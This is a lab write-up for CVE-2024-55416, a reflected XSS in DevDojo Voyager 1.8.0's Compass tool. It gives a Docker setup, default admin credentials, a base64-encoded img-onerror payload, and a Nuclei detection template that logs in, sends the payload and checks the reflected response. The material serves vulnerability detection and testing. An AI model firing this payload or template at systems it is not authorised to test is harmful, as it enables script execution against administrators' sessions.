# CVE-2024-55416: DevDojo Voyager <=1.8.0 - Reflected Cross-Site Scripting

## Description:
DevDojo Voyager through version 1.8.0 is vulnerable to reflected XSS via /admin/compass. By manipulating an authenticated user to click on a link, arbitrary Javascript can be executed.

## Reference:
- https://nvd.nist.gov/vuln/detail/CVE-2024-55416
- https://www.sonarsource.com/blog/the-tainted-voyage-uncovering-voyagers-vulnerabilities/

## Vulnerable Setup

- Execute the following commands to start a Laravel Voyager 1.8.0 server:

```
docker compose up -d
```

- After the server is started, browse to http://your-ip:8000 to see the Laravel Voyager admin panel. This server requires authentication.

## Default Login   

Username: admin@admin.com

Password: password

# Exploitation Steps

- Navigate to your URL http://your-ip:8000/admin

- Enter the Default Credentials (admin@admin.com/password) as shown below.

![image](https://github.com/user-attachments/assets/7935b0f8-1966-44c9-9d35-21a8aac72e41)

- Navigate to Tools -> Compass in the Dashboard.

![image](https://github.com/user-attachments/assets/dd38f215-48e5-4aa5-81c0-7cb711d5881f)

- Send a `GET` request to the `/admin/compass?del=` Delete endpoint with base64 encoded XSS Payload.

```bash
Payload: PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPi5sb2c=
```

![image](https://github.com/user-attachments/assets/96ed0bf2-ec25-4967-a257-416c955d62bc)

- Observe the XSS get triggered at `admin/compass?logs=true` Endpoint.

![image](https://github.com/user-attachments/assets/c6826159-f20d-4d00-8289-4793e9292481)

# Steps to Write Nuclei Template

**Variables Section**

```yaml
variables:
  username: "admin@admin.com"
  password: "password"
```

- Defines the login credentials (username and password) as variables, which can be reused in requests.

**First Request: Retrieve CSRF Token**

```yaml
  - raw:
      - |
        GET /admin/login HTTP/1.1
        Host: {{Hostname}}

    extractors:
      - type: regex
        part: body
        internal: true
        name: csrf
        group: 1
        regex:
          - 'name="_token" value="([a-zA-Z0-9]+)"'
```

- Sends a GET request to /admin/login to retrieve the login page.
- Extracts the CSRF token (_token) from the response body using a regular expression.
- Stores the extracted value in an internal variable named csrf for later use.

**Second Request: Perform Login**

```yaml
  - raw:
      - |
        POST /admin/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        _token={{csrf}}&email={{username}}&password={{password}}&

    matchers:
      - type: dsl
        dsl:
          - "contains(body,'/admin</title>')"
          - "status_code == 302"
        condition: and
        internal: true
```

- Sends a POST request to `/admin/login` with:
  - Extracted `_token`
  - Username and password from the variables

- The matchers validate a successful login by checking:
  - The response body contains `</admin</title>` (indicating admin page access).
  - The response has a `302` status code, indicating a successful login and redirection.

**Third Request: Exploit Potential XSS**

```yaml
  - raw:
      - |
        GET /admin/compass?del=PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPi5sb2c= HTTP/1.1
        Host: {{Hostname}}

    redirects: false
    matchers:
      - type: dsl
        dsl:
          - "contains(location,'/admin/compass')"
          - "status_code == 302"
        condition: and
        internal: true
```

- Sends a `GET` request to `/admin/compass?del=PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPi5sb2c=` (Base64 payload that could trigger a stored XSS or file deletion).
- Checks if the server redirects to `/admin/compass` with a 302 status code, indicating the payload was processed.

**Fourth Request: Verify XSS**

```yaml
  - raw:
      - |
        GET /admin/compass?logs=true HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - "contains(body,'Successfully deleted log file: <img src=x onerror=alert(1)>.log')"
          - "status_code == 200"
        condition: and
```

- Sends a `GET` request to `/admin/compass?logs=true` to check if logs were successfully deleted.
- Looks for the phrase: "Successfully deleted log file: <img src=x onerror=alert(1)>.log" (indicating stored XSS via log deletion).
- Ensures the response status is `200` OK.

**Nuclei Template URL** : [CVE-2024-55416](https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2024/CVE-2024-55416.yaml)

## Nuclei Command :

```bash
nuclei -t CVE-2024-55416.yaml -u http://172.30.0.2:8000 -vv
```

![image](https://github.com/user-attachments/assets/4a5873cc-520a-43a9-b97a-3c6082dccfe1)
